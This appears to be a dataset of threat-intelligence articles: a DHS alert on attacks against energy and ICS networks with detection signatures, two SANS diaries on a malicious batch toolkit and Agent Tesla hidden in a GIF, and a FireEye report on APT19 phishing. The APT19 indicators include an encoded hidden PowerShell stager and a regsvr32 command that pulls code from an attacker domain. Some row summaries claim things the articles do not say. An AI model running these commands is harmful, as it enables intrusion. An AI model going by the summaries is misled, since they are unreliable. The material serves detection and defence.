“pss.bat” and “psc.bat” to run the PsExec tool. Additionally, the threat actors would rename the tool PsExec to “ps.exe”.The batch script (“pss.bat” or “psc.bat”) is executed with domain administrator credentials. The directory “out” is created in the user’s %AppData% folder. PsExec is used to execute “scr.exe” across the network and to collect screenshots of systems in “ip.txt”. The screenshot’s filename is labeled based on the computer name of the host and stored in the target’s C:\Windows\Temp directory with a “.jpg” extension. The screenshot is then copied over to the newly created “out” directory of the system where the batch script was executed. In one instance, DHS observed an “out.zip” file created.DHS observed the threat actors create and modify a text document labeled “ip.txt” which is believed to have contained a list of host information. The threat actors used “ip.txt” as a source of hosts to perform additional reconnaissance efforts. In addition, the text documents “res.txt” and “err.txt” were observed being created as a result of the batch scripts being executed. In one instance, “res.txt” contained output from the Windows’ command “query user” across the network.Using <Username> <Password>Running -s cmd /c query user on <Hostname1>Running -s cmd /c query user on <Hostname2>Running -s cmd /c query user on <Hostname3>USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME<user1> 2 Disc 1+19:34 6/27/2017 12:35 PMAn additional batch script named “dirsb.bat” was used to gather folder and file names from hosts on the network.In addition to the batch scripts, the threat actors also used scheduled tasks to collect screenshots with “scr.exe”. In two instances, the scheduled tasks were designed to run the command “C:\Windows\Temp\scr.exe” with the argument “C:\Windows\Temp\scr.jpg”. In another instance, the scheduled task was designed to run with the argument “pss.bat” from the local administrator’s “AppData\Local\Microsoft\” folder.The threat actors commonly executed files out of various directories within the user’s AppData or Downloads folder. Some common directory names wereChromex64,Microsoft_Corporation,NT,Office365,Temp, andUpdate.Targeting of ICS and SCADA InfrastructureIn multiple instances, the threat actors accessed workstations and servers on a corporate network that contained data output from control systems within energy generation facilities. The threat actors accessed files pertaining to ICS or supervisory control and data acquisition (SCADA) systems. Based on DHS analysis of existing compromises, these files were named containing ICS vendor names and ICS reference documents pertaining to the organization (e.g., “SCADA WIRING DIAGRAM.pdf” or “SCADA PANEL LAYOUTS.xlsx”).The threat actors targeted and copied profile and configuration information for accessing ICS systems on the network. DHS observed the threat actors copying Virtual Network Connection (VNC) profiles that contained configuration information on accessing ICS systems. DHS was able to reconstruct screenshot fragments of a Human Machine Interface (HMI) that the threat actors accessed.Cleanup and Cover TracksIn multiple instances, the threat actors created new accounts on the staging targets to perform cleanup operations. The accounts created were used to clear the following Windows event logs: System, Security, Terminal Services, Remote Services, and Audit. The threat actors also removed applications they installed while they were in the network along with any logs produced. For example, the Fortinet client installed at one commercial facility was deleted along with the logs that were produced from its use. Finally, data generated by other accounts used on the systems accessed were deleted.Threat actors cleaned up intended target networks through deleting created screenshots and specific registry keys. Through forensic analysis, DHS determined that the threat actors deleted the registry key associated with terminal server client that tracks connections made to remote systems. The threat actors also deleted all batch scripts, output text documents and any tools they brought into the environment such as “scr.exe”.Detection and ResponseIOCs related to this campaign are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlists to determine whether malicious activity has been observed within their organization. System owners are also advised to run the YARA tool on any system suspected to have been targeted by these threat actors.Network Signatures and Host-Based RulesThis section contains network signatures and host-based rules that can be used to detect malicious activity associated with threat actor TTPs. Although these network signatures and host-based rules were created using a comprehensive vetting process, the possibility of false positives always remains.Network Signaturesalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""HTTP URI contains '/aspnet_client/system_web/4_0_30319/update/' (Beacon)""; sid:42000000; rev:1; flow:established,to_server; content:""/aspnet_client/system_web/4_0_30319/update/""; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)___________________________________alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""HTTP URI contains '/img/bson021.dat'""; sid:42000001; rev:1; flow:established,to_server; content:""/img/bson021.dat""; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)________________________________________alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""HTTP URI contains '/A56WY' (Callback)""; sid:42000002; rev:1; flow:established,to_server; content:""/A56WY""; http_uri; fast_pattern; classtype:bad-unknown; metadata:service http;)_________________________________________alert tcp any any -> any 445 (msg:""SMB Client Request contains 'AME_ICON.PNG' (SMB credential harvesting)""; sid:42000003; rev:1; flow:established,to_server; content:""|FF|SMB|75 00 00 00 00|""; offset:4; depth:9; content:""|08 00 01 00|""; distance:3; content:""|00 5c 5c|""; distance:2; within:3; content:""|5c|AME_ICON.PNG""; distance:7; fast_pattern; classtype:bad-unknown; metadata:service netbios-ssn;)________________________________________alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""HTTP URI OPTIONS contains '/ame_icon.png' (SMB credential harvesting)""; sid:42000004; rev:1; flow:established,to_server; content:""/ame_icon.png""; http_uri; fast_pattern:only; content:""OPTIONS""; nocase; http_method; classtype:bad-unknown; metadata:service http;)_________________________________________alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""HTTP Client Header contains 'User-Agent|3a 20|Go-http-client/1.1'""; sid:42000005; rev:1; flow:established,to_server; content:""User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip""; http_header; fast_pattern:only; pcre:""/\.(?:aspx|txt)\?[a-z0-9]{3}=[a-z0-9]{32}&/U""; classtype:bad-unknown; metadata:service http;)__________________________________________alert tcp $EXTERNAL_NET [139,445] -> $HOME_NET any (msg:""SMB Server Traffic contains NTLM-Authenticated SMBv1 Session""; sid:42000006; rev:1; flow:established,to_client; content:""|ff 53 4d 42 72 00 00 00 00 80|""; fast_pattern:only; content:""|05 00|""; distance:23; classtype:bad-unknown; metadata:service netbios-ssn;)YARA RulesThis is a consolidated rule set for malware associated with this activity. These rules were written by NCCIC and include contributions from trusted partners.*/rule APT_malware_1{meta:description = ""inveigh pen testing tools & related artifacts""author = ""DHS | NCCIC Code Analysis Team""date = ""2017/07/17""hash0 = ""61C909D2F625223DB2FB858BBDF42A76""hash1 = ""A07AA521E7CAFB360294E56969EDA5D6""hash2 = ""BA756DD64C1147515BA2298B6A760260""hash3 = ""8943E71A8C73B5E343AA9D2E19002373""hash4 = ""04738CA02F59A5CD394998A99FCD9613""hash5 = ""038A97B4E2F37F34B255F0643E49FC9D""hash6 = ""65A1A73253F04354886F375B59550B46""hash7 = ""AA905A3508D9309A93AD5C0EC26EBC9B""hash8 = ""5DBEF7BDDAF50624E840CCBCE2816594""hash9 = ""722154A36F32BA10E98020A8AD758A7A""hash10 = ""4595DBE00A538DF127E0079294C87DA0""strings:$s0 = ""file://""$s1 = ""/ame_icon.png""$s2 = ""184.154.150.66""$s3 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }$s4 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }$s5 = ""(g.charCodeAt(c)^l[(l[b]+l[e])%256])""$s6 = ""for(b=0;256>b;b++)k[b]=b;for(b=0;256>b;b++)""$s7 = ""VXNESWJfSjY3grKEkEkRuZeSvkE=""$s8 = ""NlZzSZk=""$s9 = ""WlJTb1q5kaxqZaRnser3sw==""$s10 = ""for(b=0;256>b;b++)k[b]=b;for(b=0;256>b;b++)""$s11 = ""fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])""$s12 = ""ps.exe -accepteula \\%ws% -u %user% -p %pass% -s cmd /c netstat""$s13 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }$s14 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }$s15 = { 476F206275696C642049443A202266626433373937623163313465306531 }//inveigh pentesting tools$s16 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }//specific malicious word document PK archive$s17 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }$s18 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }$s19 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }$s20 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }$s21 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }$s22 = ""5.153.58.45""$s23 = ""62.8.193.206""$s24 = ""/1/ree_stat/p""$s25 = ""/icon.png""$s26 = ""/pshare1/icon""$s27 = ""/notepad.png""$s28 = ""/pic.png""$s29 = ""http://bit.ly/2m0x8IH""condition:($s0 and $s1 or $s2) or ($s3 or $s4) or ($s5 and $s6 or $s7 and $s8 and $s9) or ($s10 and $s11) or ($s12 and $s13) or ($s14) or ($s15) or ($s16) or ($s17) or ($s18) or ($s19) or ($s20) or ($s21) or ($s0 and $s22 or $s24) or ($s0 and $s22 or $s25) or ($s0 and $s23 or $s26) or ($s0 and $s22 or $s27) or ($s0 and $s23 or $s28) or ($s29)}rule APT_malware_2{meta:description = ""rule detects malware""author = ""other""strings:$api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }$http_push = ""X-mode: push"" nocase$http_pop = ""X-mode: pop"" nocasecondition:any of them}rule Query_XML_Code_MAL_DOC_PT_2{meta:name= ""Query_XML_Code_MAL_DOC_PT_2""author = ""other""strings:$zip_magic = { 50 4b 03 04 }$dir1 = ""word/_rels/settings.xml.rels""$bytes = {8c 90 cd 4e eb 30 10 85 d7}condition:$zip_magic at 0 and $dir1 and $bytes}rule Query_Javascript_Decode";"The report details multiple targeted attacks that involved various methods such as cyberattacks and phishing attempts. The attackers spoofed emails with malicious code to gain access to sensitive information, and some used a&#x27;single admin&#x27; account to gain elevated privileges in staging networks. Cleanup actions were also taken after access was gained.";en;
https://isc.sans.edu/diary.html?storyid=0;InfoSec Handlers Diary Blog;Here is another interesting file that I found while hunting. It is a malicious Windows batch file (.bat) which helps to exploit a freshly compromised system (or... to be used by a rogue user). I don't have a lot of information about the file origin, I found it on VT (SHA256: 1a611b3765073802fb9ff9587ed29b5d2637cf58adb65a337a8044692e1184f2)[1]. The script is very simple and relies on standard windows system tools and external utilities downloaded when neede.Here is an overview of the available options. This should give you a good overview of the batch capabilities:Exploitation - Add User Account - Show/hide User Account - Enable Telent Service - Enable Psexec Service - Enable Remote Desktop Service - Remote Login bypass backdoor (setch.exe or utilman.exe) - EternalBlue - MS1710-Psexec Backdoor - Meterpreter - Cmd_shell - Vnc_Powershell - Winvnc - JRrat - Download/Execute ps1_script - Download/Execute - Post_exploits_script command shell - Persis - Ammyy Admin Trojan - Radmin Gather - Mimikatz - Mimikittenz - Hashdump - Wifi Password Dump - Sherlock (Local privilege escalation vulnerabilities Scanner) - Chrome Passwd Dump - Firefox Passwd Dump - Powerup (Vulns Founder) - Get System info - Get IPAddress - Arp Scan - Port Scanner - Get Shares List - Get Net View - Netstat - Get Process - Scan MS17-010 Vulnerablity - MS1710-Psexec_Scanner - Port Forword Privsec - MS11-046 - Invoke-BypassUAC - Invoke-WScriptBypassUAC - Invoke-MS16032 - Invoke-MS16135 - Invoke-EventVwrBypass - Invoke-EnvBypass - Invoke-FodHelperBypass - Invoke-SDCLTBypass - Invoke-PsUACme - UAC-TokenMagic - EventVwrBypass (Win=7,8,8.1,10) Tools - Install Python27 - Install Ruby187 Proxy Tunnel - Setup Proxy Tunnle - Delete Proxy Tunnle - Show All Proxy Tunnle UpdateNote the numerous typo errors (I left them as is). The script is a good example of demonstrating how easy it is to interact with a system only from a .bat file. Manipulation of users, registry keys, network, etc. The script has an update feature that fetches files from hxxp://remotebot.000webhostapp[.]com/powershellbot/. Many tools are also fetched from a GitHub repository[2] when needed.[1] https://www.virustotal.com/intelligence/search/?query=1a611b3765073802fb9ff9587ed29b5d2637cf58adb65a337a8044692e1184f2[2] https://github.com/cyberhunter00/Xavier Mertens (@xme)ISC Handler - Freelance Security ConsultantPGP Key;This report contains a wide variety of malicious tools with different types of exploits, which attackers can use to gain access to a system. It is important to scan systems and security configurations for unknown threats to prevent potential intrusions. The PowerShell scripts in the GitHub repository can manipulate system objects and perform malicious actions. The report includes information about the sample malware and its actions.;en;
https://isc.sans.edu/diary.html?storyid=0;InfoSec Handlers Diary Blog;"IntroductionOn Wednesday 2018-08-01, @dvk01uk from myonlinesecurity.co.uk tweeted about a recent example of malicious spam (malspam) pushing malware (link to tweet). In recent weeks, this type of malspam has been pushing malware using the Agent Tesla keystroke logger. It looks like Agent Tesla is still involved with today's malspam, but this time, it's not so straight-forward. An Agent Tesla binary was found hiding in an animated gif.Today's diary examines the malspam, infection traffic, and associated malware.The email and my infected lab hostThe email seems like a typical example of mass-distribution malspam. It has a spoofed sender's address, but it isn't very convincing as an actual DHL email. Header information follows:Received: from server.paperattention.com ([162.241.238.78])From: ""DHL Express International "" <dhlexpress@paperattention.com>Subject: Arrival Notice For BL - 01/08/2018 / Vessel - DHL ATLANTICDate: 01 Aug 2018 18:07 UTCShown above: Screenshot of the fake DHL email.The link returned a zip archive that contained a file named ""Arrival Notification.exe"" which looks like ""Arrival Notification"" when the file extensions are hidden (a default setting for Microsoft Windows). In my lab host, double-clicking Arrival Notification.exe caused it to copy itself to the user's AppData\Roaming directory. This malware was made persistent through a script file in the Windows Startup folder.Shown above: Downloading malware from link in the email.Shown above: Malware made persistent on my infected lab host.The trafficNetwork traffic consisted of the URL from the email, which redirected to a different URL to deliver the zip archive. After that, I saw an HTTP request to mydocuments1.is that returned an animated gif. The final line of infection traffic was an IP address check by my infected lab host to checkip.dyndns.org.Shown above: Traffic from the infection filtered in Wireshark.IP address checks may be suspicious, but they are not inherently malicious. My suggested block list based on this infection traffic is:hxxp://www.rebrand.ly/dokom91ceehxxps://a.doko.moe/bfmcuy.zipAny URL to mydocuments1.isThe animated gifThe HTTP request to mydocuments1.is returned an animated gif, which is somewhat strange. This gif was provided to Didier Stevens, who quickly found and extracted two malware binaries from it--a Windows EXE file and a Windows DLL file. According to Didier, the malware binaries were appended to the end of the gif. I reviewed the gif in a hex editor and found the PE headers for both files. It was pretty easy to carve out the binaries based on that.Shown above: An animated gif of me reviewing the animated gif in a browser (I call it ""gifception"").Shown above: Reviewed the gif in a hex editor and found the start of the 1st malware binary.Shown above: Start of the 2nd malware binary when reviewing the gif in a hex editor.Malware and artifactsThe following files are associated with this infection:SHA256 hash: 7a8e7f7cd18c0f9e74c36fb792b46ca67a20e0851caa4a21a0f341debc23e7d9File size: 333,431 bytesFile name: bfmcuy.zipFile location: hxxps://a.doko.moe/bfmcuy.zipFile description: Zip archive downloaded from link in the malspamSHA256 hash: a486a258a822173a9e621252853b8eea343d20946252042b28d454aa6db98fe4File size: 895,488 bytesFile name: Arrival Notification.exeFile location after executing: C:\Users\[username]\AppData\Roaming\kYsFdGQwnF.exeFile description: Malware from the downloaded zip archiveSHA256 hash: 96834c98d7c9e58068e78e4f4bf755a87c9c44655b4b2b4097ffc83aa3c61a3dFile size: 176 bytesFile location: C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\kYsFdGQwnF.jsFile description: Script file in Windows Startup folder to keep malware persistent after rebootSHA256 hash: 9dea34a4df20f3e2392f92d2f26dad88ba66827269431aa824c9aa8a0b80289bFile size: 641,155 bytesFile location: hxxp://mydocuments1.is/1//T/nw2lAFile description: Animated gif with 2 items of embedded malwareSHA256 hash: 81e882a394af440cea06cb490105efd721ffba30ca88ea92573d2f9ef27d2c86File size: 197,120 bytesFile description: First file extracted from the animated gif - Windows EXESHA256 hash: fda201abced38c6cb1bfb82e0e42f6e48709d5dd8c8a738a4d2d47128464afccFile size: 109,992 bytesFile description: Second file extracted from the animated gif - Windows DLLFinal wordsOutside of the embedded malware in the animated gif, I couldn't find anything unusual in my lab setup. I could not find either items of malware extracted from the gif in my infected lab host, and I didn't see any Agent Tesla-specific traffic during the infection.Criminals have embedded malware in images before, so this is not a new trick. Still, I don't commonly run into this technique among the mass-distribution malware I frequently see. Embedding malware in an animated gif might provide a way to avoid detection by security solutions. As I write this, the gif shows a detection ratio of 3 / 58 in VirusTotal.Shown above: Low detection rate in VirusTotal for gif with embedded malware.As usual, properly-administered and up-to-date Windows hosts are not likely to get infected. System administrators and the technically inclined can also implement best practices like Software Restriction Policies (SRP) or AppLocker to prevent these types of infections.A pcap of the infection traffic, associated malware, and the email example for today's diary can be found here.---Brad Duncanbrad [at] malware-traffic-analysis.net";A Malspam campaign with a keystroke logger, Agent Tesla-infected animated gif, and malware-infected zip files inside. These files were downloaded by victims via a malicious link in their email, and the zip files were installed to gain system access. The campaign was reported on 2018-08-01, and there might be Agent Tesla-specific activity in the future.;en;
https://www.mandiant.com/resources/blog/phished-at-the-request-of-counsel;Privileges and Credentials: Phished at the Request of Counsel;"SummaryIn May and June 2017, FireEye observed a phishing campaign targeting at least seven global law and investment firms. We have associated this campaign with APT19, a group that we assess is composed of freelancers, with some degree of sponsorship by the Chinese government.APT19 used three different techniques to attempt to compromise targets. In early May, the phishing lures leveraged RTF attachments that exploited the Microsoft Windows vulnerability described in CVE 2017-0199. Toward the end of May, APT19 switched to using macro-enabled Microsoft Excel (XLSM) documents. In the most recent versions, APT19 added an application whitelisting bypass to the XLSM documents. At least one observed phishing lure delivered a Cobalt Strike payload.As of the writing of this blog post, FireEye had not observed post-exploitation activity by the threat actors, so we cannot assess the goal of the campaign. We have previously observed APT19 steal data from law and investment firms for competitive economic purposes.This purpose of this blog post is to inform law firms and investment firms of this phishing campaign and provide technical indicators that their IT personnel can use for proactive hunting and detection.The EmailsAPT19 phishing emails from this campaign originated from sender email accounts from the ""@cloudsend[.]net"" domain and used a variety of subjects and attachment names. Refer to the Indicators of Compromise section for more details.The AttachmentsAPT19 leveraged Rich Text Format (RTF) and macro-enabled Microsoft Excel (XLSM) files to deliver their initial exploits. The following sections describe the two methods in further detail.RTF AttachmentsThrough the exploitation of the HTA handler vulnerability described in CVE-2017-1099, the observed RTF attachments download hxxp://tk-in-f156.2bunny[.]com/Agreement.doc. Unfortunately, this file was no longer hosted at tk-in-f156.2bunny[.]com for further analysis. Figure 1 is a screenshot of a packet capture showing one of the RTF files reaching out to hxxp://tk-in-f156.2bunny[.]com/Agreement.doc.Figure 1: RTF PCAPXLSM AttachmentsThe XLSM attachments contained multiple worksheets with content that reflected the attachment name. The attachments also contained an image that requested the user to “Enable Content”, which would enable macro support if it was disabled. Figure 2 provides a screenshot of one of the XLSM files (MD5:30f149479c02b741e897cdb9ecd22da7).Figure 2: Enable macrosOne of the malicious XLSM attachments that we observed contained a macro that:Determined the system architecture to select the correct path for PowerShell Launched a ZLIB compressed and Base64 encoded command with PowerShell. This is a typical technique used by Meterpreter stagers.Figure 3 depicts the macro embedded within the XLSM file (MD5: 38125a991efc6ab02f7134db0ebe21b6).Figure 3: XLSX MacroFigure 4 contains the decoded output of the encoded text.Figure 4: Decoded ZLIB + Base64 payloadThe shellcode invokes PowerShell to issue a HTTP GET request for a random four (4) character URI on the root of autodiscovery[.]2bunny[.]com. The requests contain minimal HTTP headers since the PowerShell command is executed with mostly default parameters. Figure 5 depicts an HTTP GET request generated by the payload, with minimal HTTP headers.Figure 5: GET Request with minimal HTTP headersConverting the shellcode to ASCII and removing the non-printable characters provides a quick way to pull out network-based indicators (NBI) from the shellcode. Figure 6 shows the extracted NBIs.Figure 6: Decoded shellcodeFireEye also identified an alternate macro in some of the XLSM documents, displayed in Figure 7.Figure 7: Alternate macroThis macro uses Casey Smith’s “Squiblydoo” Application Whitelisting bypass technique to run the command in Figure 8.Figure 8: Application Whitelisting BypassThe command in Figure 8 downloads and launches code within an SCT file. The SCT file in the payload (MD5: 1554d6fe12830ae57284b389a1132d65) contained the code shown in Figure 9.Figure 9: SCT contentsFigure 10 provides the decoded script. Notice the “$DoIt” string, which is usually indicative of a Cobalt Strike payload.Figure 10: Decoded SCT contentsA quick conversion of the contents of the variable “$var_code” from Base64 to ASCII shows some familiar network indicators, shown in Figure 11.Figure 11: $var_code to ASCIISecond Stage PayloadOnce the XLSM launches its PowerShell command, it downloads a typical Cobalt Strike BEACON payload, configured with the following parameters:Process Inject Targets: %windir%\syswow64\rundll32.exe %windir%\sysnative\rundll32.exec2_user_agents Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)Named Pipes \\%s\pipe\msagent_%xbeacon_interval 60C2 autodiscover.2bunny[.]com/submit.php autodiscover.2bunny[.]com/IE9CompatViewList.xml sfo02s01-in-f2.cloudsend[.]net/submit.php sfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xmlC2 Port TCP/80Figure 12 depicts an example of a BEACON C2 attempt from this payload.Figure 12: Cobalt Strike BEACON C2FireEye Product DetectionsThe following FireEye products currently detect and block the methods described above. Table 1 lists the current detection and blocking capabilities by product.Detection Name Product Action Notes SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) HX Detect XSLM Macro launch Gen:Variant.Application.HackTool.CobaltStrike.1 HX Detect XSLM Macro launch Malware Object HX Detect BEACON written to disk Backdoor.BEACON NX Block* BEACON Callback FE_Malformed_RTF EX/ETP/NX Block* RTF Malware.Binary.rtf EX/ETP/NX Block* RTF Malware.Binary EX/ETP/NX Block* RTF Malware.Binary.xlsx EX/ETP/NX Block* XSLMTable 1: Detection review*Appliances must be configured for block mode.RecommendationsFireEye recommends organizations perform the following steps to mitigate the risk of this campaign:Microsoft Office users should apply the patch from Microsoft as soon as possible, if they have not already installed it. Search historic and future emails that match the included indicators of compromise. Review web proxy logs for connections to the included network based indicators of compromise. Block connections to the included fully qualified domain names. Review endpoints for the included host based indicators of compromise.Indicators of CompromiseThe following section provides the IOCs for the variants of the phishing emails and malicious payloads that FireEye has observed during this campaign.Email SendersPressReader <infodept@cloudsend[.]net>Angela Suh <angela.suh@cloudsend[.]net>Ashley Safronoff <ashley.safronoff@cloudsend[.]net>Lindsey Hersh <lindsey.hersh@cloudsend[.]net>Sarah Roberto sarah.roberto@cloudsend[.]netnoreply@cloudsend[.]netEmail Subject LinesMacron Denies Authenticity Of Leak, French Prosecutors Open ProbeMacron Document Leaker Releases New Images, Promises More InformationAre Emmanuel Macron's Tax Evasion Documents Real?Time AllocationVacancy Reportchina paper table and graphresults with zeros – some ready not all finishedMacron Leaks contain secret plans for the islamisation of France and EuropeAttachment NamesMacron_Authenticity.doc.rtfMacron_Information.doc.rtfUS and EU Trade with China and China CA.xlsmTables 4 5 7 Appendix with zeros.xlsmProject Codes - 05.30.17.xlsmWeekly Vacancy Status Report 5-30-15.xlsmMacron_Tax_Evasion.doc.rtfMacron_secret_plans.doc.rtfNetwork Based Indicators (NBI)lyncdiscover.2bunny[.]comautodiscover.2bunny[.]comlyncdiscover.2bunny[.]com:443/Autodiscover/AutodiscoverService/lyncdiscover.2bunny[.]com/Autodiscoverautodiscover.2bunny[.]com/K5omsfo02s01-in-f2.cloudsend[.]net/submit.phpsfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xmltk-in-f156.2bunny[.]comtk-in-f156.2bunny[.]com/Agreement.doc104.236.77[.]169138.68.45[.]9162.243.143[.]145Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)tf-in-f167.2bunny[.]com:443 (*Only seen in VT not ITW)Host Based Indicators (HBI)RTF MD5 hash values0bef39d0e10b1edfe77617f494d733a80e6da59f10e1c4685bb5b35a30fc8fb6cebd0e9e05749665d893e78c452607e2XLSX MD5 hash values38125a991efc6ab02f7134db0ebe21b63a1dca21bfe72368f2dd46eb4d9b48c430f149479c02b741e897cdb9ecd22da7BEACON and Meterpreter payload MD5 hash valuesbae0b39197a1ac9e24bdf9a9483b18ea1151619d06a461456b310096db6bc548Process arguments, named pipes, and file pathspowershell.exe -NoP -NonI -W Hidden -Command ""Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(""<base64 blob>"")regsvr32.exe /s /n /u /i:hxxps://lyncdiscover.2bunny.com/Autodiscover scrobj.dll\\<ip>\pipe\msagent_<4 digits>C:\Documents and Settings\<user>\Local Settings\Temp\K5om.dll (4 character DLL based on URI of original GET request)Yara Rulesrule FE_LEGALSTRIKE_MACRO {meta:version="".1""filetype=""MACRO""author=""Ian.Ahl@fireeye.com @TekDefense""date=""2017-06-02""description=""This rule is designed to identify macros with the specific encoding used in the sample 30f149479c02b741e897cdb9ecd22da7.""strings:// OBSFUCATION$ob1 = ""ChrW(114) & ChrW(101) & ChrW(103) & ChrW(115) & ChrW(118) & ChrW(114) & ChrW(51) & ChrW(50) & ChrW(46) & ChrW(101)"" ascii wide$ob2 = ""ChrW(120) & ChrW(101) & ChrW(32) & ChrW(47) & ChrW(115) & ChrW(32) & ChrW(47) & ChrW(110) & ChrW(32) & ChrW(47)"" ascii wide$ob3 = ""ChrW(117) & ChrW(32) & ChrW(47) & ChrW(105) & ChrW(58) & ChrW(104) & ChrW(116) & ChrW(116) & ChrW(112) & ChrW(115)"" ascii wide$ob4 = ""ChrW(58) & ChrW(47) & ChrW(47) & ChrW(108) & ChrW(121) & ChrW(110) & ChrW(99) & ChrW(100) & ChrW(105) & ChrW(115)"" ascii wide$ob5 = ""ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(46) & ChrW(50) & ChrW(98) & ChrW(117) & ChrW(110)"" ascii wide$ob6 = ""ChrW(110) & ChrW(121) & ChrW(46) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(47) & ChrW(65) & ChrW(117) & ChrW(116)"" ascii wide$ob7 = ""ChrW(111) & ChrW(100) & ChrW(105) & ChrW(115) & ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(32)"" ascii wide$ob8 = ""ChrW(115) & ChrW(99) & ChrW(114) & ChrW(111) & ChrW(98) & ChrW(106) & ChrW(46) & ChrW(100) & ChrW(108) & ChrW(108)"" ascii wide$obreg1 = /(\w{5}\s&\s){7}\w{5}/$obreg2 = /(Chrw\(\d{1,3}\)\s&\s){7}/// wscript$wsobj1 = ""Set Obj = CreateObject(\""WScript.Shell\"")"" ascii wide$wsobj2 = ""Obj.Run "" ascii wide condition:(((uint16(0) != 0x5A4D))and(all of ($wsobj*) and 3 of ($ob*)orall of ($wsobj*) and all of ($obreg*)))}rule FE_LEGALSTRIKE_MACRO_2 {meta:version="".1""filetype=""MACRO""author=""Ian.Ahl@fireeye.com @TekDefense""date=""2017-06-02""description=""This rule was written to hit on specific variables and powershell command fragments as seen in the macro found in the XLSX file3a1dca21bfe72368f2dd46eb4d9b48c4.""strings:// Setting the environment$env1 = ""Arch = Environ(\""PROCESSOR_ARCHITECTURE\"")"" ascii wide$env2 = ""windir = Environ(\""windir\"")"" ascii wide$env3 = ""windir + \""\\syswow64\\windowspowershell\\v1.0\\powershell.exe\"""" ascii wide// powershell command fragments$ps1 = ""-NoP"" ascii wide$ps2 = ""-NonI"" ascii wide$ps3 = ""-W Hidden"" ascii wide$ps4 = ""-Command"" ascii wide$ps5 = ""New-Object IO.StreamReader"" ascii wide$ps6 = ""IO.Compression.DeflateStream"" ascii wide$ps7 = ""IO.MemoryStream"" ascii wide$ps8 = "",$([Convert]::FromBase64String"" ascii wide$ps9 = ""ReadToEnd();"" ascii wide$psregex1 = /\W\w+\s+\s\"".+\""/condition:(((uint16(0) != 0x5A4D))and(all of ($env*) and 6 of ($ps*)orall of ($env*) and 4 of ($ps*) and all of ($psregex*)))}rule FE_LEGALSTRIKE_RTF {meta:version="".1""filetype=""MACRO""author=""joshua.kim@FireEye.com""date=""2017-06-02""description=""Rtf Phishing Campaign leveraging the CVE 2017-0199 exploit, to point to the domain 2bunnyDOTcom"" strings:$header = ""{\\rt"" $lnkinfo = ""4c0069006e006b0049006e0066006f"" $encoded1 = ""4f4c45324c696e6b""$encoded2 = ""52006f006f007400200045006e007400720079""$encoded3 = ""4f0062006a0049006e0066006f""$encoded4 = ""4f006c0065"" $http1 = ""68{""$http2 = ""74{""$http3 = ""07{"" // 2bunny.com$domain1 = ""32{\\""$domain2 = ""62{\\""$domain3 = ""75{\\""$domain4 = ""6e{\\""$domain5 = ""79{\\""$domain6 = ""2e{\\""$domain7 = ""63{\\""$domain8 = ""6f{\\""$domain9 = ""6d{\\"" $datastore = ""\\*\\datastore"" condition:$header at 0 and all of them}AcknowledgementsJoshua Kim, Nick Carr, Gerry Stellatos, Charles Carmakal, TJ Dahms, Nick Richard, Barry Vengerik, Justin Prosco, Christopher Glyer";The campaign targeted multiple victims and is likely part of a larger ITW1 and ITW2 campaign. Businesses should implement appropriate security measures, including multi-factor authentication and monitoring systems to protect against any potential attacks.;en;
